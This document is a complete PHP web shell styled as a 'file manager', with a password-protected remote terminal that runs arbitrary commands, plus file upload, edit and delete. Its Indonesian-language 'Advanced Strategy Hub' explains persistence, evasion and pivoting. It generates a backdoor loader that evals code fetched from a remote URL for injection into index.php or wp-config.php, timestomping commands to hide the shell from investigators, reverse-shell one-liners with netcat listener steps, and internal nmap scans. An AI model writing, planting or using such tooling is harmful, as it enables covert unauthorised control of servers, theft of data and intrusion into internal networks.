<?php
// Helios File Manager Suite v3.0 - The Final "Advanced Warfare" Edition
// All features, bug fixes, and the Strategy Hub are fully integrated into this single file.

@session_start();
@error_reporting(0);
@set_time_limit(0);

// --- !!! GANTI INI SEKARANG JUGA !!! ---
define('HELIOS_USER', 'Xielgansz');
define('HELIOS_PASS', 'xielganteng');
// -----------------------------------------

$self = basename(__FILE__);
$message = '';

// --- AUTHENTICATION ---
if (!isset($_SESSION['is_loggedin']) || $_SESSION['is_loggedin'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
        if ($_POST['username'] === HELIOS_USER && $_POST['password'] === HELIOS_PASS) {
            $_SESSION['is_loggedin'] = true;
            header("Location: $self");
            exit;
        } else {
            $message = '<div class="alert error">Login failed! Invalid credentials.</div>';
        }
    }
    die('<!DOCTYPE html><html><head><title>Helios Login</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"><style>body{font-family:"Segoe UI",sans-serif;background:#1a1d24;color:white;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;} .login-box{background:#252932;padding:40px;border-radius:10px;box-shadow:0 15px 35px rgba(0,0,0,0.7);width:320px;border:1px solid #333;} h2{text-align:center;margin:0 0 25px 0;border-bottom:1px solid #444;padding-bottom:15px;font-weight:600;} .input-group{position:relative;margin-bottom:20px;} .input-group i{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:#888;} .input-group input{width:100%;padding:12px 12px 12px 40px;border:1px solid #444;border-radius:5px;box-sizing:border-box;background:#1a1d24;color:#e6e6e6;} button{width:100%;padding:12px;border:none;border-radius:5px;background:#00a8ff;color:white;cursor:pointer;font-weight:bold;font-size:16px;transition:background 0.2s ease;} button:hover{background:#008fdb;} .alert{padding:12px;background:#d63031;border-radius:5px;margin-bottom:15px;text-align:center;}</style></head><body><div class="login-box"><h2><i class="fa-solid fa-sun"></i> Helios Login</h2><form method="post">' . $message . '<div class="input-group"><i class="fa fa-user"></i><input type="text" name="username" placeholder="Username" required></div><div class="input-group"><i class="fa fa-lock"></i><input type="password" name="password" placeholder="Password" required></div><button type="submit">Login</button></form></div></body></html>');
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: $self");
    exit;
}

// --- HELPER FUNCTIONS ---
function formatSize($bytes) { if ($bytes >= 1073741824) { return number_format($bytes / 1073741824, 2) . ' GB'; } elseif ($bytes >= 1048576) { return number_format($bytes / 1048576, 2) . ' MB'; } elseif ($bytes >= 1024) { return number_format($bytes / 1024, 2) . ' KB'; } elseif ($bytes > 0) { return $bytes . ' B'; } else { return '0 B'; } }
function getIcon($filename) { $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); $icons = ['php'=>'file-code','html'=>'file-code','css'=>'css3-alt','js'=>'js','zip'=>'file-archive','rar'=>'file-archive','tar'=>'file-archive','gz'=>'file-archive','jpg'=>'file-image','jpeg'=>'file-image','png'=>'file-image','gif'=>'file-image','txt'=>'file-alt','log'=>'file-alt','pdf'=>'file-pdf','mp3'=>'file-audio','wav'=>'file-audio','mp4'=>'file-video','mov'=>'file-video','avi'=>'file-video','json'=>'file-code']; return $icons[$ext] ?? 'file'; }
function getServerInfo() { $free_space = @disk_free_space('/'); $total_space = @disk_total_space('/'); $used_space = $total_space - $free_space; $used_percent = ($total_space > 0) ? sprintf('%.2f',($used_space / $total_space) * 100) : 0; return [ 'os' => php_uname(), 'php_version' => PHP_VERSION, 'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A', 'disk_info' => 'Used: '.formatSize($used_space).' / '.formatSize($total_space).' ('.$used_percent.'%)' ]; }
function rrmdir($dir) { if (!is_dir($dir)) return false; $objects = scandir($dir); foreach ($objects as $object) { if ($object != "." && $object != "..") { if (is_dir($dir . "/" . $object)) rrmdir($dir . "/" . $object); else unlink($dir . "/" . $object); } } return rmdir($dir); }
function executeCommand($cmd) { $output = ''; $funcs = ['shell_exec', 'passthru', 'system', 'exec', 'popen']; foreach ($funcs as $func) { if (is_callable($func) && !in_array($func, preg_split('/,\s*/', ini_get('disable_functions')))) { if ($func === 'popen') { $handle = popen($cmd . ' 2>&1', 'r'); if ($handle) { while (!feof($handle)) { $output .= fread($handle, 8192); } pclose($handle); } } else if ($func === 'passthru') { ob_start(); passthru($cmd . ' 2>&1', $result_code); $output = ob_get_contents(); ob_end_clean(); } else { $output = $func($cmd . ' 2>&1', $result_code); } if (isset($output) && $output !== '') return htmlspecialchars($output); } } return "Execution failed: All known command execution functions are disabled or returned no output."; }


// --- PATH & STATE MANAGEMENT ---
if (isset($_GET['path'])) {
    $new_path = realpath($_GET['path']);
    if ($new_path && is_dir($new_path) && is_readable($new_path)) {
        $_SESSION['current_dir'] = $new_path;
    } else {
        $_SESSION['message'] = '<div class="alert error">Error: Cannot access path: ' . htmlspecialchars($_GET['path']) . '</div>';
    }
    header("Location: $self");
    exit;
}

$path = getcwd();
if (isset($_SESSION['current_dir']) && is_dir($_SESSION['current_dir'])) {
    @chdir($_SESSION['current_dir']);
    $path = $_SESSION['current_dir'];
}

if (isset($_SESSION['message'])) {
    $message = $_SESSION['message'];
    unset($_SESSION['message']);
}


// --- BACKEND ACTION ROUTER ---
$action = $_POST['action'] ?? $_GET['action'] ?? '';
try {
    if ($action) {
        if ($action === 'terminal' && isset($_POST['command'])) { header('Content-Type: text/plain'); echo executeCommand($_POST['command']); exit; }
        if ($action === 'view_content' && isset($_GET['item'])) { header('Content-Type: text/plain'); echo htmlspecialchars(@file_get_contents($path . '/' . $_GET['item'])); exit; }
        if ($action === 'download' && isset($_GET['item'])) { $item_path = $path . '/' . $_GET['item']; if(file_exists($item_path) && is_readable($item_path)){ header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($item_path).'"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($item_path)); readfile($item_path); exit; } else { throw new Exception("File not found or not readable."); } }

        $post_action = false;
        switch ($action) {
            case 'upload': $post_action = true; if (isset($_FILES['files'])) { $count = 0; foreach ($_FILES['files']['name'] as $i => $name) { if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $path . '/' . $name)) { $count++; } } $_SESSION['message'] = '<div class="alert success">Successfully uploaded ' . $count . ' file(s).</div>'; } break;
            case 'save_edit': $post_action = true; if (isset($_POST['file'], $_POST['content'])) { if (file_put_contents($path . '/' .$_POST['file'], $_POST['content']) !== false) { $_SESSION['message'] = '<div class="alert success">File saved successfully.</div>'; } else { throw new Exception("Failed to save file."); } } break;
            case 'new_item': $post_action = true; if (isset($_POST['name'])) { $item_path = $path . '/' . $_POST['name']; if ($_POST['type'] === 'file') { if (!file_exists($item_path) && touch($item_path)) { $_SESSION['message'] = '<div class="alert success">File created.</div>'; } else { throw new Exception("Failed to create file."); } } else { if (!file_exists($item_path) && mkdir($item_path)) { $_SESSION['message'] = '<div class="alert success">Directory created.</div>'; } else { throw new Exception("Failed to create directory."); } } } break;
            case 'delete': $post_action = true; if (isset($_POST['items'])) { $count = 0; foreach ($_POST['items'] as $item) { $item_path = $path . '/' . $item; if (is_dir($item_path)) { if(rrmdir($item_path)) $count++; } else { if(unlink($item_path)) $count++; } } $_SESSION['message'] = '<div class="alert success">Deleted ' . $count . ' item(s).</div>'; } break;
            case 'rename': $post_action = true; if (isset($_POST['old_name'], $_POST['new_name'])) { if(rename($path . '/' . $_POST['old_name'], $path . '/' . $_POST['new_name'])) { $_SESSION['message'] = '<div class="alert success">Item renamed.</div>'; } else { throw new Exception("Failed to rename item."); } } break;
            case 'chmod': $post_action = true; if (isset($_POST['item'], $_POST['perms'])) { if(chmod($path . '/' . $_POST['item'], octdec($_POST['perms']))) { $_SESSION['message'] = '<div class="alert success">Permissions changed.</div>'; } else { throw new Exception("Failed to change permissions."); } } break;
            case 'zip': $post_action = true; if(isset($_POST['items']) && isset($_POST['zip_name'])) { $zip = new ZipArchive(); $zip_name = $path . '/' . preg_replace('/[^a-zA-Z0-9\-\._]/', '', $_POST['zip_name']) . '.zip'; if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { foreach($_POST['items'] as $item) { $item_path = $path . '/' . $item; if(is_dir($item_path)) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = substr($filePath, strlen($path) + 1); $zip->addFile($filePath, $relativePath); } } } else { $zip->addFile($item_path, basename($item_path)); } } $zip->close(); $_SESSION['message'] = '<div class="alert success">Archive created: '.basename($zip_name).'</div>'; } else { throw new Exception("Failed to create archive."); } } break;
            case 'unzip': $post_action = true; if(isset($_POST['items'])) { $zip_file = $path . '/' . $_POST['items'][0]; if(pathinfo($zip_file, PATHINFO_EXTENSION) == 'zip') { $zip = new ZipArchive; if ($zip->open($zip_file) === TRUE) { $zip->extractTo($path); $zip->close(); $_SESSION['message'] = '<div class="alert success">Archive extracted.</div>'; } else { throw new Exception("Failed to open archive."); } } else { throw new Exception("Please select a .zip file to extract."); } } break;
        }

        if ($post_action) { header("Location: $self"); exit; }
    }
} catch (Exception $e) {
    $_SESSION['message'] = '<div class="alert error">' . $e->getMessage() . '</div>';
    if ($post_action ?? false) { header("Location: $self"); exit; }
    $message = $_SESSION['message']; unset($_SESSION['message']);
}

$server_info = getServerInfo();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Helios Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        :root { --bg-darker: #1a1d24; --bg-dark: #252932; --text-light: #e6e6e6; --text-muted: #888; --accent: #00a8ff; --accent-hover: #008fdb; --success: #2ecc71; --error: #e74c3c; --border-color: #404552; }
        body { font-family: "Segoe UI", sans-serif; background: var(--bg-darker); color: var(--text-light); margin: 0; padding: 20px; font-size: 14px; }
        .container { max-width: 1400px; margin: auto; }
        a { color: var(--accent); text-decoration: none; } a:hover { text-decoration: none; color: var(--accent-hover); }
        .card { background: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .card-header { padding: 15px 20px; border-bottom: 1px solid var(--border-color); font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
        .card-body { padding: 20px; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
        .info-item { background: var(--bg-darker); padding: 15px; border-radius: 5px; word-wrap: break-word; }
        .info-item .label { font-weight: bold; color: var(--text-muted); display: block; margin-bottom: 5px; }
        .actions-bar { padding: 0 0 15px 0; display: flex; flex-wrap: wrap; gap: 10px; }
        .actions-bar button, .modal button[type=submit] { background: var(--accent); color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; font-weight: 600; transition: background 0.2s ease; display: flex; align-items: center; gap: 8px;}
        .actions-bar button:hover, .modal button:hover { background: var(--accent-hover); }
        .path-bar { background: var(--bg-darker); padding: 12px; border-radius: 5px; margin-bottom: 15px; word-break: break-all; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border-color); }
        th { font-weight: 600; color: var(--text-muted); }
        tbody tr { transition: background 0.2s ease; }
        tbody tr:hover { background: #313641; }
        .perms-w { color: var(--success); } .perms-r { color: var(--error); }
        .alert { padding: 15px; border-radius: 5px; margin: 0 0 15px 0; font-weight: bold; }
        .alert.success { background: var(--success); color: #1e1e1e; }
        .alert.error { background: var(--error); color: white; }
        .actions-cell a { margin-right: 10px; font-size: 16px; color: var(--text-muted); transition: color 0.2s ease; }
        .actions-cell a:hover { color: var(--text-light); }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); }
        .modal-content { background-color: var(--bg-dark); border: 1px solid var(--border-color); margin: 5% auto; padding: 25px; border-radius: 8px; width: 80%; max-width: 800px; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
        .modal-header { display:flex; justify-content:space-between; align-items:center; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; margin: -25px -25px 20px -25px; padding: 15px 25px; }
        .modal-header h2 { margin:0; }
        .close { color: #aaa; font-size: 28px; font-weight: bold; cursor: pointer; }
        .modal-content input, .modal-content textarea, .modal-content select { width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 4px; border: 1px solid var(--border-color); font-size: 14px; box-sizing: border-box; background: var(--bg-darker); color: var(--text-light); }
        .modal-content textarea { min-height: 350px; font-family: 'Consolas', 'Courier New', monospace; }
        .modal-description { color: var(--text-muted); font-size: 13px; margin-top: -10px; margin-bottom: 15px; }
        .strategy-modal .tabs { display: flex; border-bottom: 1px solid var(--border-color); margin-bottom: 20px; }
        .strategy-modal .tab-button { background: none; border: none; color: var(--text-muted); padding: 15px 20px; cursor: pointer; font-size: 16px; font-weight:600; }
        .strategy-modal .tab-button.active { color: var(--accent); border-bottom: 3px solid var(--accent); }
        .strategy-modal .tab-content { display: none; }
        .strategy-modal .tab-content.active { display: block; }
        .strategy-modal .code-box { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 5px; font-family: 'Consolas', monospace; white-space: pre-wrap; word-wrap: break-word; cursor: pointer; user-select: all; }
        .strategy-modal h3 { border-bottom: 1px solid var(--border-color); padding-bottom: 8px; margin-top: 25px; margin-bottom: 15px; }
        .strategy-modal .input-group { display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; }
        .strategy-modal .input-group input, .strategy-modal .input-group select { flex-grow: 1; min-width: 150px; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="card-header"><i class="fa-solid fa-server"></i> Server Information</div>
        <div class="card-body info-grid">
            <div class="info-item"><span class="label">Operating System</span> <?php echo htmlspecialchars($server_info['os']); ?></div>
            <div class="info-item"><span class="label">PHP Version</span> <?php echo htmlspecialchars($server_info['php_version']); ?></div>
            <div class="info-item"><span class="label">Server IP</span> <?php echo htmlspecialchars($server_info['server_ip']); ?></div>
            <div class="info-item"><span class="label">Disk Space</span> <?php echo htmlspecialchars($server_info['disk_info']); ?></div>
        </div>
    </div>
    <div class="card">
        <div class="card-header"><i class="fa-solid fa-folder-open"></i> File Manager</div>
        <div class="card-body">
            <div class="path-bar">
                <span>Path: </span>
                <a href="?path=<?php echo urlencode(__DIR__); ?>" title="Go to Shell Home Directory">[<i class="fa-solid fa-house"></i> Home]</a>
                <?php $path_parts = explode(DIRECTORY_SEPARATOR, $path); $built_path = ''; foreach ($path_parts as $i => $part) { if ($part === '' && count($path_parts) > 1) { if ($i === 0) { echo '<a href="?path=/">/</a>'; } continue; } else if ($part === '') { continue; } $built_path_part = $part; $built_path .= DIRECTORY_SEPARATOR . $built_path_part; echo ' / <a href="?path=' . urlencode($built_path) . '">' . htmlspecialchars($built_path_part) . '</a>'; } ?>
            </div>
            <?php echo $message; ?>
            <div class="actions-bar">
                <button onclick="openModal('newModal')"><i class="fa-solid fa-plus"></i> New Item</button>
                <button onclick="openModal('uploadModal')"><i class="fa-solid fa-upload"></i> Upload</button>
                <button onclick="openModal('terminalModal')"><i class="fa-solid fa-terminal"></i> Terminal</button>
                <button onclick="openModal('strategyModal')"><i class="fa-solid fa-brain"></i> Advanced</button>
                <a href="?action=logout" style="margin-left:auto; background:var(--error); padding:10px 15px; border-radius:5px; color:white; font-weight:600;"><i class="fa-solid fa-right-from-bracket"></i> Logout</a>
            </div>
            <form id="main-form" method="post" action="<?php echo $self; ?>">
                <input type="hidden" name="action" id="form-action">
                <table style="table-layout: fixed;">
                    <thead><tr><th style="width:5%"><input type="checkbox" onchange="toggleAll(this)"></th><th style="width:40%">Name</th><th style="width:15%">Size</th><th style="width:10%">Perms</th><th style="width:15%">Modified</th><th style="width:15%">Actions</th></tr></thead>
                    <tbody>
                    <?php
                    $files = @scandir($path);
                    if ($files !== false) {
                        $items = []; foreach ($files as $file) { if ($file === '.') continue; $items[] = $file; }
                        usort($items, function($a, $b) use ($path) { $a_is_dir = is_dir($path . '/' . $a); $b_is_dir = is_dir($path . '/' . $b); if ($a === '..') return -1; if ($b === '..') return 1; if ($a_is_dir !== $b_is_dir) { return $a_is_dir ? -1 : 1; } return strcasecmp($a, $b); });
                        foreach ($items as $file) {
                             $full_path = realpath($path . DIRECTORY_SEPARATOR . $file);
                             $is_dir = is_dir($full_path);
                             if ($file === '..') { echo '<tr><td></td><td colspan="5"><a href="?path='.urlencode($full_path).'"><i class="fa-solid fa-arrow-turn-up"></i> ..</a></td></tr>'; continue; }
                             $perms = substr(sprintf('%o', @fileperms($full_path)), -4); $perm_color = is_writable($full_path) ? 'perms-w' : 'perms-r'; $link = $is_dir ? '?path=' . urlencode($full_path) : '#';
                             echo '<tr>';
                             echo '<td><input type="checkbox" name="items[]" value="' . htmlspecialchars($file) . '"></td>';
                             echo '<td style="word-wrap:break-word;"><i class="fa-solid fa-fw fa-' . ($is_dir ? 'folder' : getIcon($file)) . '"></i> <a href="' . $link . '" ' . ($is_dir ? '' : 'onclick="openViewModal(\'' . htmlspecialchars($file) . '\')"') . '>' . htmlspecialchars($file) . '</a></td>';
                             echo '<td>' . ($is_dir ? '--' : formatSize(@filesize($full_path))) . '</td>';
                             echo '<td><span class="' . $perm_color . '">' . $perms . '</span></td>';
                             echo '<td>' . date("Y-m-d H:i:s", @filemtime($full_path)) . '</td>';
                             echo '<td class="actions-cell">';
                             if (!$is_dir) echo '<a href="#" onclick="openEditModal(\'' . htmlspecialchars($file) . '\')" title="Edit"><i class="fa-solid fa-pen-to-square"></i></a>';
                             echo '<a href="#" onclick="openRenameModal(\'' . htmlspecialchars($file) . '\')" title="Rename"><i class="fa-solid fa-i-cursor"></i></a>';
                             echo '<a href="#" onclick="openChmodModal(\'' . htmlspecialchars($file) . '\', \'' . $perms . '\')" title="Chmod"><i class="fa-solid fa-sliders"></i></a>';
                             if (!$is_dir) echo '<a href="?action=download&item=' . urlencode($file) . '" title="Download"><i class="fa-solid fa-download"></i></a>';
                             echo '</td>';
                             echo '</tr>';
                        }
                    } else { echo '<tr><td colspan="6" style="text-align:center;">Error: Could not read directory. Check permissions.</td></tr>'; }
                    ?>
                    </tbody>
                </table>
                <div class="actions-bar" style="margin-top:15px;">
                    <span>With selected:</span>
                    <select id="mass-action-select" style="background:var(--bg-darker);color:var(--text-light);border:1px solid var(--border-color);border-radius:5px;padding:8px;">
                        <option value="delete">Delete</option><option value="zip">Zip</option><option value="unzip">Unzip (select one .zip file)</option>
                    </select>
                    <button type="button" onclick="handleMassAction()">Go</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div id="newModal" class="modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-plus"></i> New Item</h2><span class="close" onclick="closeModal('newModal')">&times;</span></div><p class="modal-description">Create a new empty file or a new directory in the current path.</p><form method="post" action="<?php echo $self; ?>"><input type="hidden" name="action" value="new_item"><input type="text" name="name" placeholder="Name" required><select name="type"><option value="file">File</option><option value="directory">Directory</option></select><button type="submit">Create</button></form></div></div>
<div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-upload"></i> Upload Files</h2><span class="close" onclick="closeModal('uploadModal')">&times;</span></div><p class="modal-description">Select one or more files from your computer to upload to the current directory.</p><form method="post" enctype="multipart/form-data" action="<?php echo $self; ?>"><input type="hidden" name="action" value="upload"><input type="file" name="files[]" multiple required><button type="submit">Upload</button></form></div></div>
<div id="terminalModal" class="modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-terminal"></i> Terminal</h2><span class="close" onclick="closeModal('terminalModal')">&times;</span></div><p class="modal-description">Execute shell commands directly. The command runs in the context of the script's current directory.</p><form onsubmit="runCommand(event)"><input type="text" id="command-input" placeholder="whoami, ls -la, pwd, ..."><button type="submit">Run</button></form><pre id="terminal-output" style="min-height:300px; background:#1e1e1e;"></pre></div></div>
<div id="editModal" class="modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-pen-to-square"></i> Edit File</h2><span class="close" onclick="closeModal('editModal')">&times;</span></div><form method="post" action="<?php echo $self; ?>"><input type="hidden" name="action" value="save_edit"><input type="hidden" id="edit-file-name" name="file"><textarea id="edit-file-content" name="content"></textarea><button type="submit">Save Changes</button></form></div></div>
<div id="viewModal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="view-file-name"></h2><span class="close" onclick="closeModal('viewModal')">&times;</span></div><pre id="view-file-content"></pre></div></div>
<div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-i-cursor"></i> Rename Item</h2><span class="close" onclick="closeModal('renameModal')">&times;</span></div><p class="modal-description">Enter the new name for the item.</p><form method="post" action="<?php echo $self; ?>"><input type="hidden" name="action" value="rename"><input type="hidden" id="rename-old-name" name="old_name"><input type="text" id="rename-new-name" name="new_name" required><button type="submit">Rename</button></form></div></div>
<div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-sliders"></i> Change Permissions</h2><span class="close" onclick="closeModal('chmodModal')">&times;</span></div><p class="modal-description">Enter new permissions in 3-digit octal format (e.g., 755, 644).</p><form method="post" action="<?php echo $self; ?>"><input type="hidden" name="action" value="chmod"><input type="hidden" id="chmod-item-name" name="item"><input type="text" id="chmod-perms" name="perms" required><button type="submit">Set Permissions</button></form></div></div>
<div id="strategyModal" class="modal strategy-modal"><div class="modal-content"><div class="modal-header"><h2><i class="fa-solid fa-brain"></i> Advanced Strategy Hub</h2><span class="close" onclick="closeModal('strategyModal')">&times;</span></div><div class="tabs"><button class="tab-button active" onclick="openTab(event, 'persistence')">Persistence</button><button class="tab-button" onclick="openTab(event, 'evasion')">Evasion</button><button class="tab-button" onclick="openTab(event, 'pivoting')">Pivoting</button></div><div id="persistence" class="tab-content active"><h2><i class="fa-solid fa-ghost"></i> Bertahan Hidup (Persistence)</h2><p class="modal-description">Teknik untuk memastikan aksesmu tetap ada walaupun file `helios.php` dihapus oleh admin.</p><h3>"Kecoak" Loader Generator</h3><p class="modal-description">Suntikkan kode kecil ini ke file PHP yang sering diakses (e.g., `index.php`, `wp-config.php`).</p><div class="input-group"><input type="text" id="p_apikey" placeholder="Your Secret Key (e.g., mykey123)" onkeyup="generatePersistenceCode()"><input type="text" id="p_payload" placeholder="URL to Raw Payload (e.g., Pastebin Raw)" onkeyup="generatePersistenceCode()"></div><pre id="p_code" class="code-box" onclick="copyToClipboard(this)"></pre><p class="modal-description" style="margin-top:10px;"><b>Cara Pakai:</b><br>1. Isi kolom di atas untuk membuat kode unikmu.<br>2. Klik kotak kode untuk menyalinnya.<br>3. Gunakan <b>File Manager</b> untuk mengedit file target (e.g., `index.php`) dan tempel kode ini di baris paling atas.<br>4. Untuk mengaktifkan, kunjungi `http://domain.com/file_target.php?api_key=KUNCI_RAHASIAMU`</p></div><div id="evasion" class="tab-content"><h2><i class="fa-solid fa-mask"></i> Menjadi Siluman (Evasion)</h2><p class="modal-description">Teknik untuk menyamarkan file `helios.php` agar tidak mudah ditemukan saat investigasi.</p><h3>Timestomping Helper</h3><p class="modal-description">Ubah waktu modifikasi file-mu agar sama dengan file sistem lain, membuatnya tidak mencolok.</p><div class="input-group"><input type="text" id="e_source" value="index.php" placeholder="File to copy timestamp from"><input type="text" id="e_target" value="<?php echo $self; ?>" placeholder="File to change timestamp"><button type="button" onclick="generateTimestompCode()">Generate Command</button></div><pre id="e_code" class="code-box" onclick="copyToClipboard(this)"></pre><p class="modal-description" style="margin-top:10px;"><b>Cara Pakai:</b><br>1. Pastikan file sumber ada. `index.php` biasanya pilihan yang aman.<br>2. Klik "Generate Command".<br>3. Klik kotak kode untuk menyalinnya.<br>4. Buka <b>Terminal</b>, tempel, dan jalankan perintahnya.</p></div><div id="pivoting" class="tab-content"><h2><i class="fa-solid fa-network-wired"></i> Titik Loncatan (Pivoting)</h2><p class="modal-description">Gunakan server ini sebagai pintu gerbang untuk menjelajahi jaringan internal.</p><h3>Reverse Shell Generator</h3><p class="modal-description">Buat koneksi shell yang lebih stabil dan interaktif dari server ini ke komputermu.</p><div class="input-group"><input type="text" id="piv_ip" placeholder="Your IP Address (e.g., 123.45.67.89)" onkeyup="generateReverseShell()"><input type="text" id="piv_port" placeholder="Your Port (e.g., 4444)" onkeyup="generateReverseShell()"><select id="piv_type" onchange="generateReverseShell()"><option value="bash">Bash</option><option value="python3">Python3</option><option value="php">PHP</option><option value="perl">Perl</option></select></div><pre id="piv_code" class="code-box" onclick="copyToClipboard(this)"></pre><p class="modal-description" style="margin-top:10px;"><b>Cara Pakai:</b><br>1. Di komputermu, buka terminal dan jalankan listener: <code>nc -lvnp [PORT]</code><br>2. Isi IP dan Port-mu di atas untuk membuat perintah.<br>3. Klik kotak kode untuk menyalinnya.<br>4. Buka <b>Terminal</b> di Helios, tempel, dan jalankan perintahnya. Cek terminal di komputermu.</p><h3>Internal Network Scan</h3><p class="modal-description">Cari host lain dan port yang terbuka di jaringan internal server.</p><div class="input-group"><input type="text" id="scan_target" value="192.168.1.0/24" placeholder="Target Range (e.g., 10.0.0.0/24)"><button type="button" onclick="generateScanCode()">Generate Nmap Command</button></div><pre id="scan_code" class="code-box" onclick="copyToClipboard(this)"></pre><p class="modal-description" style="margin-top:10px;"><b>Cara Pakai:</b><br>Salin dan jalankan di <b>Terminal</b>. Perintah ini hanya akan berfungsi jika `nmap` terinstall di server target.</p></div></div></div>

<script>
function openModal(id) { document.getElementById(id).style.display = 'block'; if(id==='terminalModal'){document.getElementById('command-input').focus();} }
function closeModal(id) { document.getElementById(id).style.display = 'none'; }
function toggleAll(source) { document.querySelectorAll('input[name="items[]"]').forEach(c => c.checked = source.checked); }
function handleMassAction() { let action = document.getElementById('mass-action-select').value; let form = document.getElementById('main-form'); let formAction = document.getElementById('form-action'); formAction.value = action; if (action === 'zip') { let zipName = prompt("Enter a name for the zip archive (without .zip):", "archive"); if (zipName) { let input = document.createElement('input'); input.type = 'hidden'; input.name = 'zip_name'; input.value = zipName; form.appendChild(input); form.submit(); } } else if (action === 'unzip') { let selected = document.querySelectorAll('input[name="items[]"]:checked'); if (selected.length !== 1) { alert("Please select exactly one .zip file to extract."); return; } form.submit(); } else if(action === 'delete') { if(confirm('Are you sure you want to delete the selected items? This cannot be undone.')) { form.submit(); } } }
function openEditModal(file) { document.getElementById('edit-file-name').value = file; document.getElementById('edit-file-content').value = "Loading content..."; openModal('editModal'); fetch('?action=view_content&item=' + encodeURIComponent(file)).then(response => response.text()).then(data => { document.getElementById('edit-file-content').value = data; }); }
function openViewModal(file) { document.getElementById('view-file-name').innerText = file; document.getElementById('view-file-content').innerText = "Loading content..."; openModal('viewModal'); fetch('?action=view_content&item=' + encodeURIComponent(file)).then(response => response.text()).then(data => { document.getElementById('view-file-content').innerText = data; }); }
function openRenameModal(file) { document.getElementById('rename-old-name').value = file; document.getElementById('rename-new-name').value = file; openModal('renameModal'); }
function openChmodModal(item, perms) { document.getElementById('chmod-item-name').value = item; document.getElementById('chmod-perms').value = perms; openModal('chmodModal'); }
function runCommand(event) { event.preventDefault(); let command = document.getElementById('command-input').value; let outputArea = document.getElementById('terminal-output'); outputArea.innerText = 'Running...'; fetch('<?php echo $self; ?>', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'action=terminal&command=' + encodeURIComponent(command) }).then(response => response.text()).then(data => { outputArea.innerText = data; }); document.getElementById('command-input').value = ''; }
document.addEventListener('keydown', function (event) { if (event.key === "Escape") { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); } });
function openTab(evt, tabName) { let i, tabcontent, tablinks; tabcontent = document.querySelectorAll("#strategyModal .tab-content"); for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = "none"; } tablinks = document.querySelectorAll("#strategyModal .tab-button"); for (i = 0; i < tablinks.length; i++) { tablinks[i].className = tablinks[i].className.replace(" active", ""); } document.getElementById(tabName).style.display = "block"; evt.currentTarget.className += " active"; }
function copyToClipboard(element) { navigator.clipboard.writeText(element.innerText).then(() => alert('Code copied!'), () => alert('Failed to copy.')); }
function generatePersistenceCode() { let key = document.getElementById('p_apikey').value || 'your_secret_key'; let url = document.getElementById('p_payload').value || 'https://your.payload/url.txt'; let code = `<?php if(isset($_GET['${key}'])) { @eval(@file_get_contents('${url}')); } ?>`; document.getElementById('p_code').innerText = code; }
function generateTimestompCode() { let source = document.getElementById('e_source').value; let target = document.getElementById('e_target').value; let code = `touch -r "${source}" "${target}"`; document.getElementById('e_code').innerText = code; }
